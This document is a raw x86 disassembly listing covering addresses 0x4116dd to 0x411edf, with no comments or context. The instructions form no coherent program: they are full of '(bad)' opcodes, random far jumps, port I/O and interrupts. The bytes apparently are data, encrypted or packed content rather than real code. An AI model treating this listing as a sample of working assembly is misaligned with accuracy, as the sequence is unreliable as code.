  4116dd:	dec    DWORD PTR [edi+edx*4]
  4116e0:	cli    
  4116e1:	test   al,0x3a
  4116e3:	dec    esp
  4116e4:	data16 mov ch,0xc2
  4116e7:	(bad)  
  4116e8:	jecxz  0x411700
  4116ea:	int3   
  4116eb:	and    BYTE PTR [ecx+0x2afafcc2],ah
  4116f1:	xor    ah,0x14
  4116f4:	xor    eax,ebx
  4116f6:	xor    al,0xc
  4116f8:	add    edi,DWORD PTR [edi+0xadbef76]
  4116fe:	pop    ss
  4116ff:	dec    ebx
  411700:	mov    ?,WORD PTR [ecx+0x9]
  411703:	out    0x84,al
  411705:	dec    esi
  411706:	jae    0x4116f9
  411708:	cmp    eax,0x6d6a4a3
  41170d:	add    eax,0x9a419d83
  411712:	mov    DWORD PTR gs:[edi],edi
  411715:	push   0xf6020bf7
  41171a:	jae    0x411760
  41171c:	mov    dl,0x62
  41171e:	cmc    
  41171f:	ret    0xe1fe
  411722:	push   ds
  411723:	(bad)  
  411724:	pop    WORD PTR [edi+0x1cdf62c8]
  41172b:	push   ss
  41172c:	leave  
  41172d:	and    al,0xe9
  41172f:	jns    0x4116ca
  411731:	fimul  DWORD PTR [esi-0x554749f]
  411737:	dec    esi
  411738:	push   es
  411739:	sbb    eax,0x7df9a89b
  41173e:	cmp    DWORD PTR [ecx],eax
  411740:	and    ch,BYTE PTR [edi+0x79]
  411743:	daa    
  411744:	outs   dx,DWORD PTR ds:[esi]
  411745:	add    al,0x43
  411747:	scas   al,BYTE PTR es:[di]
  411749:	or     BYTE PTR ds:0x791b0fd,0x5a
  411750:	jecxz  0x411756
  411752:	and    BYTE PTR [ebp+0x37],bh
  411755:	cli    
  411756:	pop    edx
  411757:	iret   
  411758:	jge    0x411756
  41175a:	adc    al,dh
  41175c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41175d:	cmp    eax,0x343e0ee5
  411762:	clc    
  411763:	push   ebx
  411764:	iret   
  411765:	aam    0xa4
  411767:	sbb    al,0x37
  411769:	or     al,0xf0
  41176b:	lock push edi
  41176d:	sbb    eax,0xdbb1626a
  411772:	adc    edi,DWORD PTR ds:0x46c237f9
  411778:	lods   al,BYTE PTR ds:[esi]
  411779:	mov    ah,0xeb
  41177b:	ins    DWORD PTR es:[edi],dx
  41177c:	push   eax
  41177d:	pop    ecx
  41177e:	les    eax,FWORD PTR [ecx-0x5711539b]
  411784:	xor    edx,esp
  411786:	dec    eax
  411787:	cwde   
  411788:	jecxz  0x411807
  41178a:	sub    al,0x7
  41178c:	outs   dx,DWORD PTR ds:[esi]
  41178d:	bound  ecx,QWORD PTR [eax-0x689c025d]
  411793:	cmc    
  411794:	repz stc 
  411796:	inc    esp
  411797:	push   0x63c58815
  41179c:	fimul  DWORD PTR [edi-0x427563c2]
  4117a2:	fidiv  DWORD PTR [ecx+edx*4-0x72]
  4117a6:	mov    eax,0x5257a267
  4117ab:	mov    cl,0xa2
  4117ad:	cmp    BYTE PTR [ecx+0x3b582c80],0x5
  4117b4:	push   ebp
  4117b5:	mov    dh,0x31
  4117b7:	aad    0x1b
  4117b9:	inc    DWORD PTR [edi-0x52f75c1d]
  4117bf:	and    eax,0xf185516f
  4117c4:	xchg   esi,eax
  4117c5:	xor    eax,0x75c6cc51
  4117ca:	bound  ebp,QWORD PTR [ebp-0x7f]
  4117cd:	mov    ch,0xea
  4117cf:	xor    eax,0xea604d57
  4117d4:	addps  xmm3,xmm2
  4117d7:	push   0xfffffff9
  4117d9:	sbb    DWORD PTR [edi-0x2bb443c6],ebx
  4117df:	push   edi
  4117e0:	pop    es
  4117e1:	stc    
  4117e2:	cdq    
  4117e3:	sbb    eax,0xcbfd40d3
  4117e8:	add    BYTE PTR [ebx],ah
  4117ea:	int    0x68
  4117ec:	xor    esi,0x772740
  4117f2:	dec    edi
  4117f3:	enter  0x9728,0x5
  4117f7:	add    eax,0xe62143ca
  4117fc:	call   0x254535b8
  411801:	fst    DWORD PTR [ebx+edx*1+0x58]
  411805:	aam    0x49
  411807:	test   cl,dh
  411809:	inc    edx
  41180a:	sbb    eax,0x1eb4da40
  41180f:	fdivr  QWORD PTR [edx]
  411811:	out    dx,al
  411812:	cli    
  411813:	dec    ecx
  411814:	adc    al,0xfe
  411816:	or     al,0xed
  411818:	stos   BYTE PTR es:[edi],al
  411819:	int    0xb1
  41181b:	jbe    0x411886
  41181d:	jmp    0xb3c5:0xf2fb5dc2
  411824:	xor    eax,0x24de7ff4
  411829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41182a:	outs   dx,BYTE PTR ds:[esi]
  41182b:	push   esi
  41182c:	or     eax,0x9e810e61
  411831:	popf   
  411832:	cmp    BYTE PTR [esi],ch
  411834:	mov    dh,0xae
  411836:	cmc    
  411837:	jbe    0x41184b
  411839:	xor    eax,0x188bf91e
  41183e:	pushf  
  41183f:	popa   
  411840:	retf   
  411841:	mov    dh,0xd
  411843:	jno    0x411821
  411845:	push   edi
  411846:	std    
  411847:	sbb    eax,0x3d9427fa
  41184c:	nop
  41184d:	aaa    
  41184e:	loopne 0x411816
  411850:	cdq    
  411851:	sub    DWORD PTR [eax],ebx
  411853:	cs inc edx
  411855:	or     al,0xbc
  411857:	jbe    0x4118bd
  411859:	cmp    al,0x3d
  41185b:	sbb    al,0xc8
  41185d:	sbb    al,0xe1
  41185f:	or     BYTE PTR [ecx-0x18bb069b],al
  411865:	in     al,dx
  411866:	stc    
  411867:	dec    eax
  411868:	mov    ecx,0xc21479ad
  41186d:	inc    ecx
  41186e:	xor    ebp,0xe4d9b604
  411874:	outs   dx,BYTE PTR ds:[esi]
  411875:	mov    bh,0xf5
  411877:	xor    al,0x55
  411879:	das    
  41187a:	push   esp
  41187b:	pop    eax
  41187c:	jb     0x41189a
  41187e:	jge    0x4118ac
  411880:	pop    ss
  411881:	sub    al,0xa7
  411883:	jl     0x4118ac
  411885:	out    0xcd,eax
  411887:	xor    BYTE PTR [edi-0x42],ch
  41188a:	jl     0x41186a
  41188c:	push   esi
  41188d:	pop    esp
  41188e:	in     eax,0x9f
  411890:	mov    al,0x1a
  411892:	arpl   bx,sp
  411894:	xor    al,0x56
  411896:	cmp    edi,DWORD PTR [ecx+0x29df080b]
  41189c:	mov    cl,0xed
  41189e:	scas   eax,DWORD PTR es:[edi]
  41189f:	dec    edi
  4118a0:	arpl   WORD PTR [esp+ebp*1-0xf286330],si
  4118a7:	rcl    DWORD PTR [ebx+0x69d410df],0xf
  4118ae:	(bad)  
  4118af:	jmp    0x9c574d84
  4118b4:	push   edx
  4118b5:	sub    DWORD PTR [ebx],esp
  4118b7:	xor    ah,bh
  4118b9:	xchg   ecx,eax
  4118ba:	pop    edi
  4118bb:	rol    DWORD PTR [edi],1
  4118bd:	sbb    ebx,esi
  4118bf:	push   ds
  4118c0:	dec    ecx
  4118c1:	cdq    
  4118c2:	les    esp,FWORD PTR [ecx]
  4118c4:	xor    DWORD PTR [edx],esi
  4118c6:	pop    esp
  4118c7:	xchg   BYTE PTR [eax],dl
  4118c9:	jmp    0x4118b9
  4118cb:	es jmp 0x35012d77
  4118d1:	push   ss
  4118d2:	jnp    0x41187a
  4118d4:	popa   
  4118d5:	jo     0x4118ef
  4118d7:	cmp    al,0xca
  4118d9:	xchg   ecx,eax
  4118da:	xchg   esi,eax
  4118db:	sub    bh,al
  4118dd:	out    0xf6,eax
  4118df:	adc    DWORD PTR [ebx+0x29c4d81b],edx
  4118e5:	inc    esi
  4118e6:	sahf   
  4118e7:	mov    fs,WORD PTR [eax+0x0]
  4118ea:	iret   
  4118eb:	into   
  4118ec:	xor    DWORD PTR [eax],edi
  4118ee:	jmp    0x411943
  4118f0:	and    dl,BYTE PTR ds:0x45fc5461
  4118f6:	mov    fs,WORD PTR [esi-0x9f40c6]
  4118fc:	lods   al,BYTE PTR ds:[esi]
  4118fd:	xchg   ebx,eax
  4118fe:	(bad)  
  4118ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411900:	imul   eax,DWORD PTR [eax],0xffffffab
  411903:	mov    ah,0x1c
  411905:	jno    0x4118a1
  411907:	fpatan 
  411909:	pop    edi
  41190a:	ds and al,0xff
  41190d:	sbb    al,BYTE PTR [esi]
  41190f:	xchg   edi,eax
  411910:	lds    ebx,FWORD PTR [ecx]
  411912:	sbb    eax,0x6ca4f2a4
  411917:	and    DWORD PTR ds:0x93b0bc54,edi
  41191d:	xor    eax,DWORD PTR [edx+ebx*1-0x25]
  411921:	sbb    ah,0x18
  411924:	pop    ds
  411925:	fcomp  DWORD PTR [esi+0x41118d7e]
  41192b:	add    BYTE PTR [ebx],bh
  41192d:	jns    0x4118af
  41192f:	mov    ah,0x86
  411931:	xchg   esp,eax
  411932:	int    0x92
  411934:	sbb    al,0x85
  411936:	sub    eax,0x5dad88b4
  41193b:	lds    esi,FWORD PTR [esi]
  41193d:	hlt    
  41193e:	repnz stc 
  411940:	mov    dh,0xb8
  411942:	jne    0x411993
  411944:	inc    ecx
  411945:	std    
  411946:	mov    ?,WORD PTR [edi+0x26]
  411949:	xor    dl,bl
  41194b:	inc    ebx
  41194c:	push   esp
  41194d:	jge    0x4119a2
  41194f:	push   edx
  411950:	fsub   DWORD PTR [ecx+ecx*4]
  411953:	push   eax
  411954:	fs cmp eax,ebp
  411957:	(bad)  
  411958:	fidiv  WORD PTR gs:[edi+0x48033445]
  41195f:	push   esp
  411960:	sbb    esi,DWORD PTR [ecx+0x456d6452]
  411966:	lods   eax,DWORD PTR ds:[esi]
  411967:	xchg   DWORD PTR [esi+eiz*2],esp
  41196a:	ds test eax,0x49c954f9
  411970:	push   ebx
  411971:	xchg   ebp,eax
  411972:	pusha  
  411973:	stos   BYTE PTR es:[edi],al
  411974:	push   ecx
  411975:	into   
  411976:	pop    ss
  411977:	(bad)  
  411978:	push   ebx
  411979:	adc    edi,DWORD PTR [ebp-0x17]
  41197c:	sub    BYTE PTR [eax-0x1f],ah
  41197f:	dec    esp
  411980:	cmc    
  411981:	pop    ss
  411982:	jmp    0x411934
  411984:	inc    edi
  411985:	pop    edi
  411986:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411987:	jmp    0x8ecf64bf
  41198c:	dec    edi
  41198d:	xchg   ebp,eax
  41198e:	in     eax,0xc6
  411990:	push   cs
  411991:	fwait
  411992:	not    edx
  411994:	test   al,0x23
  411996:	jae    0x4119ba
  411998:	js     0x4119c2
  41199a:	mov    dh,0x0
  41199c:	push   edi
  41199d:	dec    edx
  41199e:	(bad)  
  41199f:	cmp    BYTE PTR [edx-0x45b6ed8d],ah
  4119a5:	fldenv [esi]
  4119a7:	ror    eax,1
  4119a9:	mov    ?,WORD PTR [ebp-0x39]
  4119ac:	jne    0x4119a2
  4119ae:	push   cs
  4119af:	js     0x4119e6
  4119b1:	cmp    al,0x44
  4119b3:	mov    al,ds:0x8dc4cfb0
  4119b8:	push   esi
  4119b9:	and    esp,DWORD PTR [ebx]
  4119bb:	imul   edi,DWORD PTR [edx+esi*4-0x6a8f32e],0x3e3eb5b7
  4119c6:	push   0xb2203367
  4119cb:	out    dx,al
  4119cc:	sub    ebp,DWORD PTR [esi]
  4119ce:	ss jmp 0x41199b
  4119d1:	xor    DWORD PTR [ecx-0x2e6cea03],edx
  4119d7:	fidiv  WORD PTR [ecx-0x42]
  4119da:	adc    bl,BYTE PTR [edx+eiz*2+0x680aac18]
  4119e1:	mov    al,ds:0x439ab654
  4119e6:	aaa    
  4119e7:	shl    DWORD PTR [esi-0x28],0xec
  4119eb:	stc    
  4119ec:	push   eax
  4119ed:	mov    cl,0x1c
  4119ef:	adc    bh,dl
  4119f1:	arpl   WORD PTR [esi],bp
  4119f3:	push   cs
  4119f4:	mov    ds:0x9d85a429,al
  4119f9:	ja     0x4119c1
  4119fb:	jge    0x4119e6
  4119fd:	lock sbb eax,edi
  411a00:	sub    DWORD PTR [esi+0x1a],0xd2522023
  411a07:	dec    esi
  411a08:	leave  
  411a09:	push   eax
  411a0a:	mov    ecx,0xe192522a
  411a0f:	in     al,dx
  411a10:	das    
  411a11:	jecxz  0x411a40
  411a13:	enter  0x956a,0x8b
  411a17:	or     DWORD PTR [edi+0x7156e1a5],eax
  411a1d:	mov    ecx,0xdb2e0218
  411a22:	jno    0x411a72
  411a24:	addr16 xchg esi,eax
  411a26:	loope  0x411a8d
  411a28:	out    dx,eax
  411a29:	adc    al,0x79
  411a2b:	adc    ebx,0xffffffdd
  411a2e:	or     al,0x3d
  411a30:	cmp    eax,0x39b1a714
  411a35:	jae    0x411a39
  411a37:	fdiv   DWORD PTR [eax-0x66]
  411a3a:	adc    al,0x9
  411a3c:	mov    esp,0xc5f8e887
  411a41:	mov    ah,0x56
  411a43:	dec    ecx
  411a44:	cmp    al,0x43
  411a46:	push   edx
  411a47:	(bad)  
  411a48:	mov    al,0x12
  411a4a:	sbb    al,BYTE PTR [eax-0x6d]
  411a4d:	sbb    eax,0x63df84f
  411a52:	jmp    0xa882:0x83ca73e0
  411a59:	mov    bh,0x89
  411a5b:	push   0xffffffb4
  411a5d:	cs jae 0x411a85
  411a60:	jmp    0x411ac7
  411a62:	jno    0x411a40
  411a64:	pop    ebp
  411a65:	hlt    
  411a66:	sbb    ecx,DWORD PTR [ebp+0x69fc00e8]
  411a6c:	adc    BYTE PTR [eax-0x5],bh
  411a6f:	fistp  DWORD PTR [edi]
  411a71:	cmp    DWORD PTR [eax],edx
  411a73:	sbb    eax,0xb1aee1c
  411a78:	aam    0x7d
  411a7a:	enter  0x7244,0x5b
  411a7e:	test   cl,ch
  411a80:	inc    esi
  411a81:	in     eax,0x1b
  411a83:	test   edi,esi
  411a85:	sahf   
  411a86:	fcomp  DWORD PTR [ecx]
  411a88:	aam    0x34
  411a8a:	(bad)  
  411a8b:	push   esp
  411a8c:	add    DWORD PTR [bp+si-0x23aa],eax
  411a91:	push   ebx
  411a92:	ds popf 
  411a94:	push   ebx
  411a95:	mov    eax,0x433d9d48
  411a9a:	push   eax
  411a9b:	stos   DWORD PTR es:[edi],eax
  411a9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a9d:	mov    ebp,0x496068e3
  411aa2:	mov    ds:0xd508cf8c,al
  411aa7:	ror    BYTE PTR [eax],cl
  411aa9:	dec    esp
  411aaa:	in     al,dx
  411aab:	imul   edx,DWORD PTR [ecx-0x2561163a],0x7f
  411ab2:	xchg   DWORD PTR [bp+si],esi
  411ab5:	lea    ecx,[ebx+0x656a2716]
  411abb:	in     al,0xbe
  411abd:	xor    eax,0xec2914da
  411ac2:	int    0x10
  411ac4:	lods   al,BYTE PTR ds:[esi]
  411ac5:	pop    ds
  411ac6:	inc    ebx
  411ac7:	ret    0x5350
  411aca:	pop    es
  411acb:	mov    eax,ds:0x3a4348b8
  411ad0:	jp     0x411b4d
  411ad2:	call   0xf5d8f04d
  411ad7:	xlat   BYTE PTR ds:[ebx]
  411ad8:	ds aas 
  411ada:	mov    edi,0xd26cf5fe
  411adf:	not    BYTE PTR [edx-0x2e]
  411ae2:	dec    esi
  411ae3:	pop    ebp
  411ae4:	jnp    0x411a98
  411ae6:	fxch   st(5)
  411ae8:	lods   eax,DWORD PTR ds:[esi]
  411ae9:	sbb    ah,BYTE PTR [ebx+0x32]
  411aec:	xchg   esp,eax
  411aed:	mov    cl,0x98
  411aef:	call   0x732f8522
  411af4:	mov    ch,0xd7
  411af6:	pop    edi
  411af7:	inc    edi
  411af8:	loope  0x411aaf
  411afa:	jecxz  0x411b51
  411afc:	pop    edi
  411afd:	mov    al,ds:0x34e896a2
  411b02:	pop    ebx
  411b03:	mov    DWORD PTR [esi],ebp
  411b05:	stos   DWORD PTR es:[edi],eax
  411b06:	jnp    0x411b85
  411b08:	xor    eax,0xe67486b5
  411b0d:	test   BYTE PTR [ecx-0x74b7cd06],al
  411b13:	dec    esp
  411b14:	push   0x8a002bce
  411b19:	cmp    ebp,DWORD PTR [esi]
  411b1b:	inc    ebx
  411b1c:	or     dh,BYTE PTR [esp+edi*2-0x211bc024]
  411b23:	push   cs
  411b24:	fwait
  411b25:	or     al,0xf0
  411b27:	(bad)  
  411b28:	out    dx,eax
  411b29:	fisttp WORD PTR [ebp+0x1f]
  411b2c:	xlat   BYTE PTR ds:[ebx]
  411b2d:	mov    WORD PTR [edi-0x5a],es
  411b30:	mov    ecx,0xef0de271
  411b35:	enter  0xa2fe,0xc
  411b39:	popa   
  411b3a:	adc    ah,BYTE PTR [ecx]
  411b3c:	lahf   
  411b3d:	and    al,0x26
  411b3f:	ret    
  411b40:	jl     0x411b24
  411b42:	mov    WORD PTR [esi+0x23],ds
  411b45:	xor    al,0xe1
  411b47:	mov    eax,ds:0x32b67c36
  411b4c:	jle    0x411ba5
  411b4e:	repnz sbb eax,0xb28123a6
  411b54:	pop    es
  411b55:	call   0xc03635ab
  411b5a:	addr16 mov al,ds:0x3b3
  411b5f:	and    esp,DWORD PTR [edi]
  411b61:	ss loop 0x411b34
  411b64:	into   
  411b65:	mov    ds:0xa97ff977,eax
  411b6b:	(bad)  
  411b6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b6d:	out    dx,eax
  411b6e:	jae    0x411b32
  411b70:	push   esi
  411b71:	mov    edi,0x5cf98315
  411b76:	retf   
  411b77:	lods   eax,DWORD PTR ds:[esi]
  411b78:	nop
  411b79:	or     al,0x51
  411b7b:	lods   eax,DWORD PTR ds:[esi]
  411b7c:	outs   dx,DWORD PTR ds:[esi]
  411b7d:	or     DWORD PTR [ecx+0x65],esi
  411b80:	or     DWORD PTR [edi],esp
  411b82:	pop    ds
  411b83:	outs   dx,BYTE PTR ds:[esi]
  411b84:	int    0x80
  411b86:	and    BYTE PTR [esi-0x6a],bl
  411b89:	pop    esi
  411b8a:	mov    esp,0xf7b7ac2e
  411b8f:	xlat   BYTE PTR ds:[ebx]
  411b90:	mov    ch,0xfb
  411b92:	mov    bl,0x6e
  411b94:	leave  
  411b95:	push   eax
  411b96:	pop    ecx
  411b97:	dec    ecx
  411b98:	jmp    0x4120a3
  411b9d:	rcl    bh,0xcd
  411ba0:	(bad)  
  411ba1:	int    0xc6
  411ba3:	xlat   BYTE PTR ds:[ebx]
  411ba4:	aad    0xef
  411ba6:	sahf   
  411ba7:	mov    esi,0x45659c66
  411bac:	jb     0x411b7e
  411bae:	js     0x411c2f
  411bb0:	js     0x411c1c
  411bb2:	jl     0x411c2c
  411bb4:	js     0x411b39
  411bb6:	fwait
  411bb7:	pop    ebp
  411bb8:	jbe    0x411c2c
  411bba:	add    al,0x3b
  411bbc:	pop    esi
  411bbd:	adc    edx,DWORD PTR [esp+eax*8+0x4ed881e3]
  411bc4:	jg     0x411b96
  411bc6:	dec    ebp
  411bc7:	cdq    
  411bc8:	popf   
  411bc9:	jae    0x411b60
  411bcb:	push   ebp
  411bcc:	xchg   edx,eax
  411bcd:	lahf   
  411bce:	or     eax,0xb9db43f7
  411bd4:	mov    dl,0xf6
  411bd6:	lock test BYTE PTR [ebp+0x21],bl
  411bda:	lds    ebx,FWORD PTR [esi-0x6b]
  411bdd:	retf   0xd138
  411be0:	jmp    0x8ef3f308
  411be5:	popf   
  411be6:	repz mov ds:0xdad59164,eax
  411bec:	repz jge 0x411ba6
  411bef:	fild   WORD PTR fs:[edx-0x55]
  411bf3:	je     0x411be3
  411bf5:	fcomp  DWORD PTR es:[ecx]
  411bf8:	add    eax,0xa6abfba4
  411bfd:	fucomp st(4)
  411bff:	push   ebx
  411c00:	jecxz  0x411b92
  411c02:	mov    ecx,0xa4706144
  411c07:	xor    ch,BYTE PTR [eax-0x4d]
  411c0a:	enter  0x10ad,0x78
  411c0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c0f:	(bad)  
  411c11:	ret    0x3eef
  411c14:	adc    ebx,ecx
  411c16:	inc    esi
  411c17:	xchg   eax,ebp
  411c19:	jp     0x411c0a
  411c1b:	inc    ebp
  411c1c:	xor    eax,0x19ae86fa
  411c21:	aas    
  411c22:	mov    ds:0x7d09430a,al
  411c27:	ins    BYTE PTR es:[edi],dx
  411c28:	adc    edx,DWORD PTR [edi-0x62]
  411c2b:	lahf   
  411c2c:	std    
  411c2d:	push   0xffffff80
  411c2f:	pop    es
  411c30:	sti    
  411c31:	lea    ebp,[edx]
  411c33:	shl    DWORD PTR [edi+0x72a809d7],cl
  411c39:	mov    ch,BYTE PTR [edi+0x43]
  411c3c:	test   eax,0x7f054217
  411c41:	adc    al,0xc3
  411c43:	call   0x4755fc7b
  411c48:	ja     0x411c24
  411c4a:	(bad)
  411c4d:	ret    
  411c4e:	repz test al,0x32
  411c51:	popa   
  411c52:	mov    edx,ss
  411c54:	std    
  411c55:	jl     0x411cc4
  411c57:	dec    esi
  411c58:	dec    edx
  411c59:	(bad)  
  411c5a:	push   edi
  411c5b:	jle    0x411cd5
  411c5d:	ins    DWORD PTR es:[edi],dx
  411c5e:	pushf  
  411c5f:	mov    cs,ebx
  411c61:	cli    
  411c62:	lahf   
  411c63:	jne    0x411c1d
  411c65:	jmp    0xf57c1145
  411c6a:	out    dx,eax
  411c6b:	jo     0x411c57
  411c6d:	mov    ecx,0x30de928f
  411c72:	shl    ch,0x78
  411c75:	or     eax,0xc6338fe5
  411c7a:	clc    
  411c7b:	imul   esp,edi,0x63
  411c7e:	dec    esi
  411c7f:	data16 loope 0x411c73
  411c82:	or     DWORD PTR [esi+0x73f3e178],0x58
  411c89:	xchg   BYTE PTR [ebx],cl
  411c8b:	jae    0x411c74
  411c8d:	arpl   WORD PTR [edi+0x6a],bx
  411c90:	sbb    al,0x1b
  411c92:	je     0x411c3d
  411c94:	push   0xa541f9bf
  411c99:	mov    eax,ds:0xc4a7cfcb
  411c9e:	pop    es
  411c9f:	adc    bl,BYTE PTR [esi-0x1f]
  411ca2:	(bad)  
  411ca3:	in     al,0x76
  411ca5:	mov    ss:0x190cf21,eax
  411cab:	pop    esp
  411cac:	imul   edx,DWORD PTR [ebx+0x2768efce],0xffffffdd
  411cb3:	int3   
  411cb4:	loop   0x411ca7
  411cb6:	(bad)  
  411cb7:	fcomp  QWORD PTR [esi+ecx*8-0x682d1702]
  411cbe:	imul   bh
  411cc0:	dec    edi
  411cc1:	inc    ecx
  411cc2:	daa    
  411cc3:	rcr    BYTE PTR [edi-0x924a74e],0x2b
  411cca:	push   esp
  411ccb:	mov    cl,dh
  411ccd:	adc    al,0xdb
  411ccf:	aam    0x39
  411cd1:	or     dh,BYTE PTR [eax-0x75]
  411cd4:	lock (bad) 
  411cd6:	idiv   BYTE PTR [eax+0x70324eb1]
  411cdc:	ret    
  411cdd:	je     0x411d5a
  411cdf:	dec    ebx
  411ce0:	jmp    0x52fd:0x4fb76d47
  411ce7:	push   0x5bc9ea65
  411cec:	jecxz  0x411d34
  411cee:	fild   DWORD PTR [eax+esi*8+0x210603e6]
  411cf5:	mov    bl,BYTE PTR [eax]
  411cf7:	jmp    0x411cfe
  411cf9:	and    BYTE PTR ds:0xbb47eaab,0x1c
  411d00:	rol    DWORD PTR [ecx],1
  411d02:	(bad)  [edx+esi*8]
  411d05:	dec    edx
  411d06:	jl     0x411d50
  411d08:	jmp    0x323b4e17
  411d0d:	pop    eax
  411d0e:	mov    dh,0x91
  411d10:	jmp    0x7e48b1a
  411d15:	push   ecx
  411d16:	jl     0x411d19
  411d18:	iret   
  411d19:	mov    ch,0xec
  411d1b:	repnz sbb DWORD PTR [esi-0x74],0x5ac8dd5d
  411d23:	loopne 0x411d1d
  411d25:	pop    esi
  411d26:	iret   
  411d27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d28:	inc    ecx
  411d29:	adc    dh,BYTE PTR [esi-0x59]
  411d2c:	out    0x6b,al
  411d2e:	add    bl,BYTE PTR [ebx+0x18]
  411d31:	mov    al,ds:0x48bb9d61
  411d36:	jne    0x411d3e
  411d38:	jg     0x411d37
  411d3a:	jl     0x411d79
  411d3c:	nop
  411d3d:	(bad)  [edx+0x3e40d22f]
  411d43:	cmp    esi,DWORD PTR [ecx+0x42a0e2e8]
  411d49:	mov    ecx,0xd44cac4a
  411d4f:	fst    st(0)
  411d51:	dec    edi
  411d52:	leave  
  411d53:	pop    es
  411d54:	or     DWORD PTR [eax+0x729a8cef],esp
  411d5a:	int3   
  411d5b:	icebp  
  411d5c:	neg    DWORD PTR [ebx+0x2d]
  411d5f:	pusha  
  411d60:	test   DWORD PTR [edx+0x29],0x82ea9368
  411d67:	out    dx,al
  411d68:	lds    eax,FWORD PTR [ecx-0x44d7689b]
  411d6e:	add    ebp,DWORD PTR [edi-0x6d6d7884]
  411d74:	dec    eax
  411d75:	push   eax
  411d76:	lea    ebx,[ebx-0x17c51cdd]
  411d7c:	or     bh,BYTE PTR [edx-0x28d1a517]
  411d82:	scas   al,BYTE PTR es:[edi]
  411d83:	cmp    ecx,DWORD PTR [ecx-0x149ca780]
  411d89:	fimul  WORD PTR [edi]
  411d8b:	imul   esp,DWORD PTR [edx-0x754f25c9],0xc96c43b5
  411d95:	sbb    edx,DWORD PTR [edi]
  411d97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d98:	arpl   bx,sp
  411d9a:	jmp    0x5e5:0x871f22a8
  411da1:	push   esp
  411da2:	jl     0x411d64
  411da4:	(bad)  
  411da5:	sub    eax,0xf29f45b0
  411daa:	(bad)  
  411dab:	mov    ch,0x88
  411dad:	shl    dl,1
  411daf:	jle    0x411e2f
  411db1:	xor    DWORD PTR [esi],esi
  411db3:	xor    ecx,DWORD PTR [esi+0x2815b9a2]
  411db9:	or     eax,0x12849bf3
  411dbe:	sbb    edi,edi
  411dc0:	dec    esp
  411dc1:	shl    DWORD PTR ss:[edi-0xd],0x13
  411dc6:	ds call 0x8753:0x43fb7e60
  411dce:	mov    eax,0x26228859
  411dd3:	sbb    ecx,esi
  411dd5:	inc    ebx
  411dd6:	mov    eax,0x108dc20e
  411ddb:	fdivr  st,st(1)
  411ddd:	inc    esi
  411dde:	aas    
  411ddf:	xor    DWORD PTR [ecx],ecx
  411de1:	fisub  DWORD PTR [eax]
  411de3:	pop    es
  411de4:	jnp    0x411e26
  411de6:	fisub  DWORD PTR [edi+0x10]
  411de9:	cli    
  411dea:	xchg   edi,eax
  411deb:	push   cs
  411dec:	sub    edi,DWORD PTR [edi]
  411dee:	sub    al,0xfc
  411df0:	sub    dh,BYTE PTR [ebp+0x2bb492be]
  411df6:	cwde   
  411df7:	(bad)  
  411df8:	adc    DWORD PTR [ebp-0x4855df23],0xc818c3d
  411e02:	test   eax,0xbf99d78c
  411e07:	push   esi
  411e08:	mov    edi,0xa010ff2
  411e0d:	dec    ecx
  411e0e:	aam    0x75
  411e10:	xchg   ebx,eax
  411e11:	mov    ebp,0xfad8c1b3
  411e16:	sar    ecx,0x51
  411e19:	xchg   DWORD PTR [esi-0x56],edx
  411e1c:	test   BYTE PTR [ecx],dl
  411e1e:	adc    ch,ah
  411e20:	bound  esp,QWORD PTR [edx-0x54]
  411e23:	cmp    eax,0x98aad8ef
  411e28:	and    ebx,DWORD PTR [eax+0x2d0fcbc6]
  411e2e:	push   esp
  411e2f:	sub    eax,0xf4024e8f
  411e34:	(bad)  
  411e35:	lods   eax,DWORD PTR ds:[esi]
  411e36:	mov    ch,0x19
  411e38:	es sti 
  411e3a:	ret    0x9aa7
  411e3d:	push   0xffffff96
  411e3f:	std    
  411e40:	jg     0x411df0
  411e42:	add    cl,ah
  411e44:	xor    al,0xeb
  411e46:	or     eax,DWORD PTR [esp+edx*2+0x5c]
  411e4a:	dec    ebx
  411e4b:	pop    edi
  411e4c:	pusha  
  411e4d:	and    eax,0x4f1981eb
  411e52:	ret    
  411e53:	xchg   BYTE PTR [eax+ecx*8],ah
  411e56:	mov    ebp,0xf4c20436
  411e5b:	add    DWORD PTR [ecx+0x36],0xffffff82
  411e5f:	and    al,0x96
  411e61:	mov    esp,0x47bed2de
  411e66:	imul   DWORD PTR [ebx+ebx*1+0x66]
  411e6a:	inc    edx
  411e6b:	inc    edx
  411e6c:	add    ebp,DWORD PTR [eax]
  411e6e:	(bad)  
  411e70:	adc    cl,ch
  411e72:	cmp    BYTE PTR [ebp+0x66],cl
  411e75:	cmp    DWORD PTR ds:0xabe463f6,ebx
  411e7b:	lds    ebx,FWORD PTR [edi+0x20]
  411e7e:	mul    DWORD PTR [edx+0x5016e2f]
  411e84:	mov    eax,ds:0xaaf8c224
  411e89:	test   BYTE PTR [edi-0x2f],bl
  411e8c:	stos   DWORD PTR es:[di],eax
  411e8e:	js     0x411ec4
  411e90:	mov    ebx,0x5dea8b42
  411e95:	xor    DWORD PTR [ecx+edi*4],0xffffffe6
  411e99:	inc    esp
  411e9a:	pop    ebp
  411e9b:	cmp    al,0x8c
  411e9d:	fnsave [eax-0x25]
  411ea0:	xor    al,0xea
  411ea2:	outs   dx,DWORD PTR ds:[esi]
  411ea3:	and    BYTE PTR ds:0x40cca019,0xe4
  411eaa:	add    bl,BYTE PTR [edi]
  411eac:	div    edi
  411eae:	jmp    0x411ef3
  411eb0:	xor    DWORD PTR [eax+0x77ed84c0],0x73
  411eb7:	outs   dx,BYTE PTR ds:[esi]
  411eb8:	lea    edi,[edi]
  411eba:	xor    al,0x27
  411ebc:	ss adc edx,ebp
  411ebf:	out    0x90,eax
  411ec1:	push   0x52
  411ec3:	mov    ecx,0xf5c54686
  411ec8:	and    DWORD PTR [ebx+0x5bda9d9c],0xb0f0ab37
  411ed2:	inc    ecx
  411ed3:	in     eax,0x4
  411ed5:	int3   
  411ed6:	dec    eax
  411ed7:	mov    WORD PTR [ebp-0x5047db68],gs
  411edd:	out    0x8b,eax
  411edf:	push   0x9d837143
